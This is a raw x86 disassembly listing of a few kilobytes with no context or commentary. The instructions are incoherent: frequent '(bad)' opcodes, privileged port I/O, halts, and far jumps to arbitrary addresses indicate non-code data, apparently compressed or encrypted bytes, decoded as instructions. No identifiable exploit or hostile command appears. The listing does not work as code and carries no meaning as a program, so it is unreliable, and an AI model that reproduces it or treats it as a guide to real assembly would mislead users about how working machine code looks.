  41f5fb:	outs   dx,BYTE PTR ds:[esi]
  41f5fc:	fcom   DWORD PTR [edx-0x43]
  41f5ff:	pushf  
  41f600:	jmp    0x41f63f
  41f602:	mov    esp,0x7efde288
  41f607:	dec    esi
  41f608:	push   ecx
  41f609:	fs clc 
  41f60b:	dec    ecx
  41f60c:	hlt    
  41f60d:	cwde   
  41f60e:	jns    0x41f5d0
  41f610:	lock and eax,0xbea999af
  41f616:	adc    BYTE PTR [eax],cl
  41f618:	jbe    0x41f654
  41f61a:	(bad)  [ebx]
  41f61c:	loop   0x41f5e1
  41f61e:	inc    ecx
  41f61f:	sub    esp,esi
  41f621:	test   dh,dh
  41f623:	ins    DWORD PTR es:[edi],dx
  41f624:	sbb    ebp,DWORD PTR [eax+0x16683c2c]
  41f62a:	jnp    0x41f638
  41f62c:	jmp    0xf3c7:0x6fc961f3
  41f633:	inc    esp
  41f634:	cmp    al,BYTE PTR [edi]
  41f636:	push   edi
  41f637:	stos   DWORD PTR es:[edi],eax
  41f638:	xor    al,0x4
  41f63a:	push   eax
  41f63b:	pop    ds
  41f63c:	out    dx,eax
  41f63d:	mov    esp,0xf615d5a5
  41f642:	outs   dx,BYTE PTR ds:[esi]
  41f643:	(bad)  
  41f644:	push   0x93cfc4f1
  41f649:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f64a:	nop
  41f64b:	in     eax,0x9
  41f64d:	push   0x38
  41f64f:	xor    edi,esp
  41f651:	dec    eax
  41f652:	and    DWORD PTR [ecx+0x34d10030],0xc5bfe9
  41f65c:	dec    ecx
  41f65d:	dec    ebp
  41f65e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f65f:	sti    
  41f660:	and    al,0x32
  41f662:	(bad)  
  41f663:	cmp    eax,DWORD PTR [ebx+0x51123cb5]
  41f669:	imul   esp,DWORD PTR [edi-0x378cb485],0xa96730a6
  41f673:	in     eax,0x6
  41f675:	pop    edi
  41f676:	out    dx,eax
  41f677:	xchg   edx,eax
  41f678:	ret    
  41f679:	xor    eax,0x63638c3a
  41f67e:	sbb    ebp,DWORD PTR [edi+edi*4]
  41f681:	in     eax,0x16
  41f683:	cmp    DWORD PTR [edx+0x7ade4e8a],eax
  41f689:	xchg   edi,eax
  41f68a:	dec    eax
  41f68b:	loopne 0x41f6e6
  41f68d:	cmp    eax,0x8f5428d
  41f692:	cwde   
  41f693:	jae    0x41f714
  41f695:	pop    ss
  41f696:	popa   
  41f697:	(bad)  
  41f698:	cmc    
  41f699:	or     esp,edi
  41f69b:	dec    edi
  41f69c:	push   0x63616d82
  41f6a1:	call   0x2aac:0x617d9536
  41f6a8:	sar    edi,0xcc
  41f6ab:	cmp    eax,0x4b96c441
  41f6b0:	add    BYTE PTR [ecx+0x29],ah
  41f6b3:	rcl    BYTE PTR [ebx],cl
  41f6b5:	dec    edx
  41f6b6:	add    BYTE PTR [eax],bh
  41f6b8:	cdq    
  41f6b9:	and    al,0x17
  41f6bb:	jl     0x41f70d
  41f6bd:	cmp    BYTE PTR [edi],dh
  41f6bf:	push   eax
  41f6c0:	idiv   ecx
  41f6c2:	ds mov cl,0x8d
  41f6c5:	lods   al,BYTE PTR ds:[esi]
  41f6c6:	hlt    
  41f6c7:	adc    ch,BYTE PTR [edi+0x53]
  41f6ca:	push   esp
  41f6cb:	push   edi
  41f6cc:	not    BYTE PTR ds:0x572a0ecf
  41f6d3:	sbb    al,BYTE PTR [ebx]
  41f6d5:	jl     0x41f6e0
  41f6d7:	stos   BYTE PTR es:[edi],al
  41f6d8:	repz (bad)
  41f6db:	cli    
  41f6dc:	mov    bl,0xeb
  41f6de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6df:	inc    ebx
  41f6e0:	dec    DWORD PTR [ebx+0x23]
  41f6e3:	mov    WORD PTR [ecx-0x1ac02d03],cs
  41f6e9:	inc    esi
  41f6ea:	push   esp
  41f6eb:	push   es
  41f6ec:	out    dx,al
  41f6ed:	jecxz  0x41f683
  41f6ef:	adc    al,0x9a
  41f6f1:	mov    ds:0xa67cf545,al
  41f6f6:	ret    0xfaff
  41f6f9:	ins    DWORD PTR es:[edi],dx
  41f6fa:	push   ecx
  41f6fb:	push   edx
  41f6fc:	dec    eax
  41f6fd:	out    0x56,eax
  41f6ff:	ror    DWORD PTR [ecx+0x20],cl
  41f702:	cld    
  41f703:	cmp    al,0x12
  41f705:	xor    ecx,DWORD PTR [esi+0x62972eff]
  41f70b:	add    BYTE PTR [ebp+0x31],0x2e
  41f70f:	(bad)  [edi+0x4949e8ba]
  41f715:	fist   WORD PTR [ebx-0x33]
  41f718:	xor    ah,ch
  41f71a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f71b:	pop    ecx
  41f71c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f71d:	and    ebx,DWORD PTR [edi-0x4b3be151]
  41f723:	or     eax,0xf2da6ab8
  41f728:	stc    
  41f729:	cmp    bl,BYTE PTR [ebx]
  41f72b:	mov    dh,0x3
  41f72d:	fsubr  st,st(7)
  41f72f:	jns    0x41f6f5
  41f731:	mov    eax,0x8a520ead
  41f736:	rcr    BYTE PTR ds:0xb1870c30,cl
  41f73c:	out    0xf3,al
  41f73e:	adc    al,0x5
  41f740:	mov    al,0x99
  41f742:	inc    ebp
  41f743:	jmp    0x41f714
  41f745:	pushf  
  41f746:	dec    ecx
  41f747:	aas    
  41f748:	outs   dx,BYTE PTR ds:[esi]
  41f749:	mov    dh,0xa6
  41f74b:	pop    esi
  41f74c:	xchg   esp,eax
  41f74d:	pusha  
  41f74e:	jecxz  0x41f7c9
  41f750:	mov    al,0x5f
  41f752:	test   DWORD PTR [eax-0x5d56fc51],ecx
  41f758:	sbb    BYTE PTR [edx-0x36],cl
  41f75b:	jp     0x41f77c
  41f75d:	push   es
  41f75e:	jb     0x41f735
  41f760:	jo     0x41f6fb
  41f762:	dec    esi
  41f763:	mov    ebp,0x356cea8d
  41f768:	mov    ds:0x765b6684,eax
  41f76d:	push   0x4e
  41f76f:	iret   
  41f770:	pop    es
  41f771:	loop   0x41f7ee
  41f773:	in     eax,dx
  41f774:	mov    WORD PTR [esp+ebx*4-0x35],cs
  41f778:	sub    ch,BYTE PTR [esi+0x3d]
  41f77b:	test   ch,0xed
  41f77e:	test   al,0x23
  41f780:	xchg   ebx,eax
  41f781:	scas   al,BYTE PTR es:[edi]
  41f782:	jle    0x41f713
  41f784:	jmp    0x99884427
  41f789:	ja     0x41f7df
  41f78b:	xor    DWORD PTR [eax-0x7e0c39d5],esi
  41f791:	mov    eax,0xcdb74875
  41f796:	and    eax,0x9f173164
  41f79b:	mov    dl,0x5c
  41f79d:	int    0xb
  41f79f:	or     BYTE PTR [eax],dh
  41f7a1:	inc    esi
  41f7a2:	loop   0x41f7f1
  41f7a4:	mov    eax,0x5864b88
  41f7a9:	shl    DWORD PTR [edx],0xa0
  41f7ac:	mov    bl,0x28
  41f7ae:	push   esi
  41f7af:	aaa    
  41f7b0:	(bad)  [ebp+0x19]
  41f7b3:	inc    edx
  41f7b4:	lock sbb BYTE PTR ds:0x79a312f7,ch
  41f7bb:	lods   al,BYTE PTR ds:[esi]
  41f7bc:	jns    0x41f73e
  41f7be:	lods   eax,DWORD PTR ds:[esi]
  41f7bf:	sbb    eax,0x589b4338
  41f7c4:	inc    esp
  41f7c5:	pop    ebp
  41f7c6:	jle    0x41f7aa
  41f7c8:	aaa    
  41f7c9:	retf   0xb631
  41f7cc:	lods   eax,DWORD PTR ds:[esi]
  41f7cd:	sbb    al,0xf8
  41f7cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7d0:	mov    ?,WORD PTR [esp+ebp*8-0x6d6a9b18]
  41f7d7:	aaa    
  41f7d8:	push   esi
  41f7d9:	in     al,dx
  41f7da:	push   esi
  41f7db:	mov    WORD PTR [edi+0x1d],cs
  41f7de:	sub    BYTE PTR [esi],bh
  41f7e0:	jbe    0x41f7fa
  41f7e2:	xchg   ebx,eax
  41f7e3:	push   esi
  41f7e4:	inc    ch
  41f7e6:	or     cl,BYTE PTR [eax+0x2fb5ef43]
  41f7ec:	mov    BYTE PTR [edi],cl
  41f7ee:	ret    0x67b9
  41f7f1:	sar    DWORD PTR [edx-0x6f],cl
  41f7f4:	data16 jmp 0x41f7e9
  41f7f7:	push   es
  41f7f8:	ja     0x41f7d9
  41f7fa:	mov    ah,0x4e
  41f7fc:	add    al,0xc7
  41f7fe:	push   ebx
  41f7ff:	ret    
  41f800:	inc    eax
  41f801:	js     0x41f7b6
  41f803:	pop    ebp
  41f804:	idiv   DWORD PTR [esi]
  41f806:	jle    0x41f7b2
  41f808:	mov    edi,?
  41f80a:	enter  0xe9ae,0xf1
  41f80e:	pop    ss
  41f80f:	dec    esp
  41f810:	cmc    
  41f811:	shr    BYTE PTR [edx-0x7f1d1883],0x6e
  41f818:	retf   
  41f819:	gs add al,0xa7
  41f81c:	xchg   edi,eax
  41f81d:	sahf   
  41f81e:	mov    eax,ds:0xb9d02f92
  41f823:	mov    BYTE PTR [ecx+0x59395dd9],ch
  41f829:	mov    ebx,0xf4c120b7
  41f82e:	or     dh,dl
  41f830:	add    esi,esp
  41f832:	pop    edi
  41f833:	cmc    
  41f834:	dec    ebp
  41f835:	pop    ss
  41f836:	ds stos DWORD PTR es:[edi],eax
  41f838:	clc    
  41f839:	(bad)  
  41f83a:	pop    ecx
  41f83b:	rcl    BYTE PTR [ebx-0x74],1
  41f83e:	mov    bh,0x16
  41f840:	or     ch,bh
  41f842:	add    ecx,edi
  41f844:	(bad)  
  41f845:	mov    WORD PTR [edi],cs
  41f847:	cld    
  41f848:	sub    eax,0x5e98d8a1
  41f84d:	add    al,0x17
  41f84f:	rol    DWORD PTR [ebp-0x7efe9de],1
  41f855:	stc    
  41f856:	cdq    
  41f857:	sbb    al,BYTE PTR [edi-0x734c25d4]
  41f85d:	mov    ah,0xa4
  41f85f:	pusha  
  41f860:	pop    edi
  41f861:	or     al,0xfd
  41f863:	xchg   ebp,eax
  41f864:	clc    
  41f865:	xor    esi,DWORD PTR [bp+0x482c]
  41f86a:	or     eax,esi
  41f86c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f86d:	xchg   ebp,eax
  41f86e:	adc    bh,BYTE PTR [edx-0x59]
  41f871:	pop    es
  41f872:	int3   
  41f873:	mov    ebx,DWORD PTR [ebx+0x31]
  41f876:	add    eax,0x6a2a5834
  41f87b:	mov    dl,0xc1
  41f87d:	add    ebx,DWORD PTR [ebp+0x77]
  41f880:	xor    eax,0xe73a2afe
  41f885:	xchg   DWORD PTR [esi-0x65],ebx
  41f888:	cdq    
  41f889:	inc    eax
  41f88a:	push   ds
  41f88b:	in     eax,0x71
  41f88d:	add    al,0x8c
  41f88f:	pop    ebx
  41f890:	dec    ebx
  41f891:	iret   
  41f892:	js     0x41f833
  41f894:	clc    
  41f895:	das    
  41f896:	and    ch,BYTE PTR [ecx-0x3676bdf3]
  41f89c:	test   BYTE PTR [edx],ah
  41f89e:	ret    
  41f89f:	jle    0x41f915
  41f8a1:	out    0x5c,eax
  41f8a3:	jnp    0x41f8b5
  41f8a5:	sub    BYTE PTR [ecx-0x3cd8d409],0x31
  41f8ac:	mov    bh,0xb
  41f8ae:	sbb    DWORD PTR [esi+0x7],esi
  41f8b1:	dec    edi
  41f8b2:	gs inc eax
  41f8b4:	call   0xad72:0x278cd442
  41f8bb:	call   0xa5ed:0x463890f2
  41f8c2:	mov    ebx,0xc027e4b0
  41f8c7:	mov    DWORD PTR [edi],esi
  41f8c9:	fist   DWORD PTR [edi-0x2d]
  41f8cc:	outs   dx,DWORD PTR ds:[esi]
  41f8cd:	xchg   esi,eax
  41f8ce:	add    eax,0x89d09288
  41f8d3:	pop    edx
  41f8d4:	lds    ebx,FWORD PTR [ebp+ebp*2-0x5bc866bf]
  41f8db:	fst    st(3)
  41f8dd:	add    esp,DWORD PTR [eax]
  41f8df:	and    eax,0x27b9458f
  41f8e4:	xchg   ecx,eax
  41f8e5:	inc    edi
  41f8e6:	pop    es
  41f8e7:	mov    edi,0xddf14ea7
  41f8ec:	sar    eax,cl
  41f8ee:	mov    ch,0xca
  41f8f0:	xlat   BYTE PTR ds:[ebx]
  41f8f1:	cwde   
  41f8f2:	xchg   BYTE PTR [ecx],ch
  41f8f4:	(bad)
  41f8f7:	nop
  41f8f8:	xchg   DWORD PTR [di-0x2],edi
  41f8fc:	mov    esp,0x3886c939
  41f901:	bound  ecx,QWORD PTR [eax]
  41f903:	mov    esi,0xe9556388
  41f908:	add    al,0x31
  41f90b:	jns    0x41f8d8
  41f90d:	das    
  41f90e:	repz mov ah,0x3e
  41f911:	cmp    DWORD PTR ds:0xef564af6,esi
  41f917:	xor    BYTE PTR ds:0xbaacc311,dl
  41f91d:	jmp    0x41f8d0
  41f91f:	outs   dx,BYTE PTR ds:[esi]
  41f920:	xor    ecx,DWORD PTR [ebx]
  41f922:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f923:	jg     0x41f8bd
  41f925:	jo     0x41f964
  41f927:	jns    0x41f8b8
  41f929:	lahf   
  41f92a:	dec    ecx
  41f92b:	test   DWORD PTR [eax+0x56d0bcfe],esi
  41f931:	arpl   WORD PTR [ebp-0x41f74b21],cx
  41f937:	sub    al,0xe6
  41f939:	mov    eax,ds:0x2691fc03
  41f93e:	mov    al,ds:0xa936c0c
  41f943:	in     al,dx
  41f944:	cmp    bh,BYTE PTR [eax]
  41f946:	cwde   
  41f947:	add    esp,DWORD PTR [eax-0x2dc1ca1d]
  41f94d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f94e:	push   edx
  41f94f:	in     al,dx
  41f950:	mov    ebp,0xbec770f2
  41f955:	lods   al,BYTE PTR ds:[esi]
  41f956:	dec    ecx
  41f957:	repz sub BYTE PTR [eax-0x45980a4a],bh
  41f95e:	cmp    DWORD PTR [ecx+0xe],ebx
  41f961:	xor    DWORD PTR [eax+0x55],edi
  41f964:	mov    ds:0x69352df6,al
  41f969:	xchg   BYTE PTR [ecx],dl
  41f96b:	ja     0x41f98b
  41f96d:	nop
  41f96e:	jae    0x41f966
  41f970:	outs   dx,BYTE PTR ds:[esi]
  41f971:	and    DWORD PTR [ebp+eiz*2+0x7b2f39b8],ebx
  41f978:	(bad)  
  41f979:	jmp    0xbd33:0xbaf3bca9
  41f980:	sub    eax,0x4333206b
  41f985:	ja     0x41f9a1
  41f987:	sbb    DWORD PTR ds:0x42581727,esi
  41f98d:	shr    DWORD PTR [edx-0x17],1
  41f990:	icebp  
  41f991:	(bad)  
  41f992:	pop    edx
  41f993:	retf   0xcd25
  41f996:	loope  0x41f937
  41f998:	sbb    DWORD PTR [esi-0x40],0x48
  41f99c:	adc    eax,0xa1317877
  41f9a1:	fdivr  st,st(5)
  41f9a3:	dec    eax
  41f9a4:	emms   
  41f9a6:	push   ebx
  41f9a7:	mov    edi,edi
  41f9a9:	sti    
  41f9aa:	sahf   
  41f9ab:	inc    edi
  41f9ac:	mov    cl,0xd0
  41f9ae:	fst    st(1)
  41f9b0:	popf   
  41f9b1:	loopne 0x41fa2a
  41f9b3:	cmp    eax,0x25f4e098
  41f9b8:	pop    esi
  41f9b9:	push   0x77
  41f9bb:	push   ebx
  41f9bc:	cmp    esi,esi
  41f9be:	push   edx
  41f9bf:	mov    al,0x67
  41f9c1:	or     dl,BYTE PTR [ebx-0x61]
  41f9c4:	mov    bh,0x4c
  41f9c6:	jl     0x41f9ed
  41f9c8:	mov    WORD PTR ss:[edx+0x5f],ds
  41f9cc:	lea    ecx,[edi+0xa]
  41f9cf:	stos   DWORD PTR es:[edi],eax
  41f9d0:	loope  0x41f978
  41f9d2:	lods   eax,DWORD PTR ds:[esi]
  41f9d3:	int3   
  41f9d4:	jl     0x41f9e9
  41f9d6:	ret    
  41f9d7:	and    al,0xbb
  41f9d9:	ror    BYTE PTR [ecx-0x4a],0xae
  41f9dd:	xchg   esi,eax
  41f9de:	retf   0x74ca
  41f9e1:	(bad)  
  41f9e2:	jbe    0x41f9f9
  41f9e4:	jmp    0xd1c763cc
  41f9e9:	xchg   ebx,eax
  41f9ea:	sub    BYTE PTR [ecx-0x2d],0x37
  41f9ee:	push   ecx
  41f9ef:	mov    edx,eax
  41f9f1:	popf   
  41f9f2:	pop    ebp
  41f9f3:	add    eax,0x6efb9d07
  41f9f8:	push   0xbe4b70f0
  41f9fd:	lock add esi,DWORD PTR [edx-0x7a]
  41fa01:	xchg   ecx,eax
  41fa02:	pusha  
  41fa03:	add    dh,BYTE PTR [esi+0x2b]
  41fa06:	sub    DWORD PTR [edx],ecx
  41fa08:	cwde   
  41fa09:	hlt    
  41fa0a:	ins    BYTE PTR es:[edi],dx
  41fa0b:	or     DWORD PTR [ebp-0x37],eax
  41fa0e:	clc    
  41fa0f:	xor    eax,edx
  41fa11:	jns    0x41fa18
  41fa13:	cli    
  41fa14:	sub    BYTE PTR [edi-0x3d],ch
  41fa17:	pop    eax
  41fa18:	loop   0x41f9b3
  41fa1a:	sub    bh,BYTE PTR [ecx+0x4fda4031]
  41fa20:	jmp    0x1654:0x91a8ae07
  41fa27:	sbb    cl,bh
  41fa29:	sub    eax,0xfe3044c9
  41fa2e:	push   DWORD PTR [edx]
  41fa30:	out    0x58,eax
  41fa32:	sbb    ebx,DWORD PTR [esi-0x67df0fe1]
  41fa38:	imul   edx,DWORD PTR [ecx+0x17],0xffffff82
  41fa3c:	jns    0x41f9f8
  41fa3e:	add    al,0x4
  41fa40:	stos   BYTE PTR es:[edi],al
  41fa41:	xor    bh,BYTE PTR [esi+0x1e4a7ac8]
  41fa47:	push   ss
  41fa48:	lds    ebp,FWORD PTR [edi-0x59]
  41fa4b:	ja     0x41fa75
  41fa4d:	cmp    ah,BYTE PTR [edi-0x64f666]
  41fa53:	test   ah,cl
  41fa55:	mov    ebx,0x8354ee6b
  41fa5a:	jle    0x41fa16
  41fa5c:	lea    esi,[ecx+0x20cf545e]
  41fa62:	scas   eax,DWORD PTR es:[edi]
  41fa63:	xor    bh,BYTE PTR [ecx-0x1d]
  41fa66:	jnp    0x41fa1f
  41fa68:	pusha  
  41fa69:	scas   al,BYTE PTR es:[edi]
  41fa6a:	mov    edx,0x3e3832da
  41fa6f:	ins    BYTE PTR es:[edi],dx
  41fa70:	sub    BYTE PTR [eax],al
  41fa72:	lahf   
  41fa73:	out    dx,eax
  41fa74:	sub    eax,0x27ac5ec5
  41fa79:	mov    ds:0xcc3dcdf4,eax
  41fa7e:	pop    ds
  41fa7f:	add    al,0x46
  41fa81:	lds    ebx,FWORD PTR [ecx]
  41fa83:	cmp    DWORD PTR [eax+eax*2-0x7a91cf83],ebx
  41fa8a:	push   esi
  41fa8b:	pop    edi
  41fa8c:	rcl    ah,0xa7
  41fa8f:	xchg   edi,eax
  41fa90:	enter  0xba3d,0x5c
  41fa94:	mov    eax,0x88620bea
  41fa99:	mov    ebp,0xd2430014
  41fa9e:	es cwde 
  41faa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41faa1:	int3   
  41faa2:	xor    DWORD PTR [edx],ebp
  41faa4:	push   ebx
  41faa5:	lods   eax,DWORD PTR ds:[esi]
  41faa6:	xor    eax,0xa35f3dfd
  41faab:	(bad)  
  41faac:	sti    
  41faad:	add    eax,0xc848da51
  41fab2:	dec    esi
  41fab3:	shl    DWORD PTR [ebx],1
  41fab5:	rcr    BYTE PTR [esi],cl
  41fab7:	cmp    BYTE PTR [edi],0xd1
  41faba:	mov    bh,0x9c
  41fabc:	pop    esi
  41fabd:	inc    eax
  41fabe:	ins    DWORD PTR es:[edi],dx
  41fabf:	xchg   ebx,eax
  41fac0:	push   ebp
  41fac1:	xor    dh,BYTE PTR [eax+0x12da86cc]
  41fac7:	pop    ds
  41fac8:	mov    dh,0x8f
  41faca:	mov    al,0xd8
  41facc:	adc    esi,edx
  41face:	ret    
  41facf:	je     0x41fae9
  41fad1:	outs   dx,DWORD PTR ds:[esi]
  41fad2:	cdq    
  41fad3:	inc    edi
  41fad4:	inc    edi
  41fad5:	pop    DWORD PTR [ebp-0x6d7b0765]
  41fadb:	stos   DWORD PTR es:[edi],eax
  41fadc:	pop    es
  41fadd:	mov    ?,WORD PTR [bx+di-0x2cf8]
  41fae2:	test   al,0x5e
  41fae4:	daa    
  41fae5:	mov    dl,0xf5
  41fae7:	and    bl,BYTE PTR [ebx+0x643e232c]
  41faed:	cdq    
  41faee:	pop    esp
  41faef:	popf   
  41faf0:	ss mov ebx,0x4cf293d6
  41faf6:	jl     0x41fb6b
  41faf8:	jbe    0x41fa95
  41fafa:	iret   
  41fafb:	xor    BYTE PTR [eax+0x16],dl
  41fafe:	sbb    eax,0x88e3162
  41fb03:	push   ebp
  41fb04:	popa   
  41fb05:	cmp    BYTE PTR [edx+0x37],bl
  41fb08:	and    al,cl
  41fb0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb0b:	lods   eax,DWORD PTR ds:[esi]
  41fb0c:	fisubr DWORD PTR [ebx]
  41fb0e:	test   DWORD PTR [eax+esi*2+0x64f4edae],edx
  41fb15:	xor    ch,BYTE PTR [eax]
  41fb17:	shr    DWORD PTR [esi-0x22],cl
  41fb1a:	push   0x420a35c3
  41fb1f:	dec    esi
  41fb20:	xchg   edx,eax
  41fb21:	cmc    
  41fb22:	add    al,BYTE PTR [edx-0x31]
  41fb25:	cmp    eax,0xe83ed28c
  41fb2a:	arpl   WORD PTR [ecx],bx
  41fb2c:	and    eax,0x529b0c66
  41fb31:	push   ecx
  41fb32:	out    0xcf,eax
  41fb34:	sbb    eax,0xd6a610b9
  41fb39:	mov    dh,0x51
  41fb3b:	sbb    ebx,esi
  41fb3d:	mov    cl,BYTE PTR [esi-0x7052e407]
  41fb43:	lock mov esp,0x29b972c7
  41fb49:	sub    ebx,DWORD PTR [eax-0x67]
  41fb4c:	repz xor edx,0xffffffcf
  41fb50:	daa    
  41fb51:	or     DWORD PTR [ebx],esp
  41fb53:	mov    edx,0x4ebdb403
  41fb58:	outs   dx,BYTE PTR ds:[esi]
  41fb59:	add    DWORD PTR [ecx-0x11cbf162],esi
  41fb5f:	xor    eax,0x30f0333b
  41fb64:	loop   0x41fbbc
  41fb66:	jmp    0xcd6ed0d4
  41fb6b:	fs jl  0x41fbec
  41fb6e:	jno    0x41fb82
  41fb70:	add    al,0x93
  41fb72:	sub    DWORD PTR [edi-0x34],ecx
  41fb75:	pop    edx
  41fb76:	dec    ebx
  41fb77:	scas   eax,DWORD PTR es:[edi]
  41fb78:	jne    0x41fb7e
  41fb7a:	pop    ecx
  41fb7b:	clc    
  41fb7c:	outs   dx,BYTE PTR ds:[esi]
  41fb7d:	jns    0x41fbbe
  41fb7f:	xor    BYTE PTR [edx+0x35],bh
  41fb82:	jmp    0x70991790
  41fb87:	fstp   TBYTE PTR [ebp-0x60]
  41fb8a:	jb     0x41fbd8
  41fb8c:	retf   
  41fb8d:	test   BYTE PTR [ebp-0x551cfb6e],ch
  41fb93:	dec    eax
  41fb94:	sub    eax,0x379ebd03
  41fb99:	cli    
  41fb9a:	sbb    DWORD PTR [ebp-0x19],eax
  41fb9d:	pusha  
  41fb9e:	dec    esp
  41fb9f:	sti    
  41fba0:	clc    
  41fba1:	fild   WORD PTR [edx+ecx*2-0x332040c1]
  41fba8:	icebp  
  41fba9:	add    eax,0x41138d17
  41fbae:	sahf   
  41fbaf:	and    al,0x69
  41fbb1:	add    al,0x80
  41fbb3:	add    esp,DWORD PTR [ebx-0x52]
  41fbb6:	mov    BYTE PTR ds:0xed2acf11,bh
  41fbbc:	inc    ecx
  41fbbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbbe:	xlat   BYTE PTR ds:[ebx]
  41fbbf:	mov    esi,0xe19f45ec
  41fbc4:	inc    esi
  41fbc5:	in     eax,dx
  41fbc6:	test   eax,0x9fdcb4de
  41fbcb:	inc    edx
  41fbcc:	xchg   ecx,eax
  41fbcd:	std    
  41fbce:	xor    DWORD PTR [esp-0x43],0x45
  41fbd3:	dec    edx
  41fbd4:	dec    esi
  41fbd5:	iret   
  41fbd6:	ret    0xbf36
  41fbd9:	xchg   DWORD PTR [edi+0x4041c81e],ebx
  41fbdf:	mov    bh,0x3d
  41fbe1:	push   ds
  41fbe2:	inc    esp
  41fbe3:	arpl   WORD PTR [edi],bp
  41fbe5:	imul   ebx,eax,0x2ee7b1ca
  41fbeb:	out    0x31,al
  41fbed:	lods   al,BYTE PTR ds:[esi]
  41fbee:	and    edi,DWORD PTR [edx+0x7]
  41fbf1:	pop    es
  41fbf2:	cs into 
  41fbf4:	stc    
  41fbf5:	aam    0xfc
  41fbf7:	mov    esp,0xb6510a24
  41fbfc:	std    
  41fbfd:	call   0x3db6cc93
  41fc02:	sahf   
  41fc03:	add    DWORD PTR [ecx],ecx
  41fc05:	jge    0x41fc38
  41fc07:	ja     0x41fba2
  41fc09:	(bad)
  41fc0e:	dec    ebp
  41fc0f:	adc    ah,cl
  41fc11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc12:	hlt    
  41fc13:	mov    ebp,0x338820b
  41fc18:	ror    DWORD PTR [esp+esi*2+0x39],cl
  41fc1c:	jp     0x41fc46
  41fc1e:	test   DWORD PTR [esi-0xa],0x8b2a8908
  41fc25:	mov    esi,DWORD PTR [esi-0x45]
  41fc28:	bound  edi,QWORD PTR [eax+0x62]
  41fc2b:	add    cl,BYTE PTR [edx+0x7b283d7d]
  41fc31:	xor    ebx,eax
  41fc33:	imul   edx,DWORD PTR [edx-0xa9cf4a9],0x1cd3abd5
  41fc3d:	or     ecx,DWORD PTR [ebx+0x2a3c860a]
  41fc43:	cwde   
  41fc44:	in     al,0x18
  41fc46:	es cld 
  41fc48:	repnz and bl,BYTE PTR ds:0xf9ee5b02
  41fc4f:	cmp    al,0xb7
  41fc51:	fcos   
  41fc53:	js     0x41fc94
  41fc55:	pop    ebp
  41fc56:	xchg   DWORD PTR [ebp-0x1d4efbb0],edi
  41fc5c:	out    0xc7,al
  41fc5e:	(bad)  
  41fc5f:	lahf   
  41fc60:	push   es
  41fc61:	push   ebx
  41fc62:	(bad)  
  41fc63:	push   esi
  41fc64:	dec    esp
  41fc65:	xchg   eax,ebp
  41fc67:	or     eax,0x6cc74971
  41fc6c:	pop    es
  41fc6d:	je     0x41fbf6
  41fc6f:	xor    eax,0x851cacf8
  41fc74:	dec    esp
  41fc75:	fadd   DWORD PTR [ecx+eax*2]
  41fc78:	jg     0x41fc71
  41fc7a:	inc    ebx
  41fc7b:	sub    al,0x2e
  41fc7d:	outs   dx,DWORD PTR ds:[esi]
  41fc7e:	test   DWORD PTR [edi+ebp*1],eax
  41fc81:	xchg   esp,eax
  41fc82:	jne    0x41fc6b
  41fc84:	shl    BYTE PTR [ecx],1
  41fc86:	cmp    bl,cl
  41fc88:	or     eax,0x7a7344c0
  41fc8d:	btc    DWORD PTR [ecx+0x701d728c],ebx
  41fc94:	jecxz  0x41fcd2
  41fc96:	cmp    DWORD PTR ss:[eax+0x1a458f4a],esp
  41fc9d:	data16 cs rcl cl,cl
  41fca1:	and    DWORD PTR [edx+0x34143e7c],ebp
  41fca7:	mov    al,0xa
  41fca9:	cmp    ebx,eax
  41fcab:	in     al,0x81
  41fcad:	inc    esp
  41fcae:	lds    edx,FWORD PTR [edx-0x749ecbbb]
  41fcb4:	mov    ecx,0x9621bcad
  41fcb9:	sub    edx,DWORD PTR [edi]
  41fcbb:	(bad)
  41fcbe:	loope  0x41fc54
  41fcc0:	jae    0x41fd2a
  41fcc2:	mov    ch,0xe1
  41fcc4:	or     esi,DWORD PTR [edi+eax*2-0x2d30f2de]
  41fccb:	repnz dec ebx
  41fccd:	repnz pop ebp
  41fccf:	in     al,0xc8
  41fcd1:	call   DWORD PTR [edx-0x1d]
  41fcd4:	add    eax,0xf6bf7fe0
  41fcd9:	aaa    
  41fcda:	fisubr WORD PTR [eax-0x23]
  41fcdd:	(bad)  
  41fcde:	fidiv  DWORD PTR [edx-0x5f1aa7e9]
  41fce4:	aad    0x88
  41fce6:	aaa    
  41fce7:	xor    al,0x33
  41fce9:	clc    
  41fcea:	mov    al,0xe8
  41fcec:	data16 fild DWORD PTR [edx]
  41fcef:	jnp    0x41fc74
  41fcf1:	retf   
  41fcf2:	dec    ebx
  41fcf3:	or     BYTE PTR [ebx-0x52],dh
  41fcf6:	retf   
  41fcf7:	adc    esi,esp
  41fcf9:	xor    dl,al
  41fcfb:	or     esp,DWORD PTR [eax+0x42]
  41fcfe:	mov    dh,0xe9
  41fd00:	aam    0xe7
  41fd02:	push   cs
  41fd03:	int3   
  41fd04:	sub    esp,edi
  41fd06:	repz cdq 
  41fd08:	sbb    DWORD PTR [edi+0x46],esp
  41fd0b:	mov    dh,0xf1
  41fd0d:	shl    BYTE PTR fs:[ecx+0x277e510],0xd8
  41fd15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd16:	push   ebp
  41fd17:	repz rcr al,0x2d
  41fd1b:	sahf   
  41fd1c:	xor    eax,0xec90a8c3
  41fd21:	sbb    BYTE PTR [eax],0xd3
  41fd24:	js     0x41fd1a
  41fd26:	sub    eax,0xc6077233
  41fd2b:	pop    edx
  41fd2c:	add    ebx,DWORD PTR [di+0x5a]
  41fd30:	inc    edi
  41fd31:	sbb    BYTE PTR [eax],bh
  41fd33:	adc    BYTE PTR [edi],bl
  41fd35:	jbe    0x41fcc2
  41fd37:	out    0x19,al
  41fd39:	(bad)  
  41fd3a:	aaa    
  41fd3b:	jge    0x41fdaa
  41fd3d:	push   esi
